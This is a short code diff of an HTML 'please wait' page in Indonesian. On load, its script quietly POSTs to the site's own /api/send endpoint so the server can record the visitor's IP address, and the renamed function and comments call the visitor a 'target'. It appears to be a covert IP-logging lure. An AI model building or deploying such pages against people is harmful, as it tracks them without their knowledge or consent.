@@ -8,21 +8,22 @@
   <h3>Mohon tunggu...</h3>
 
   <script>
-    async function track() {
+    async function trackTarget() {
       try {
+        // Panggil server, server yang ambil IP target
         const res = await fetch("/api/send", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({}) // data kosong, server ambil IP dari request
+          body: JSON.stringify({}) // tidak perlu data tambahan
         });
-        const data = await res.json();
-        console.log("Terkirim:", data);
+        const result = await res.json();
+        console.log("Result API:", result);
       } catch (err) {
         console.error("Error:", err);
       }
     }
 
-    track();
+    trackTarget();
   </script>
 </body>
 </html>
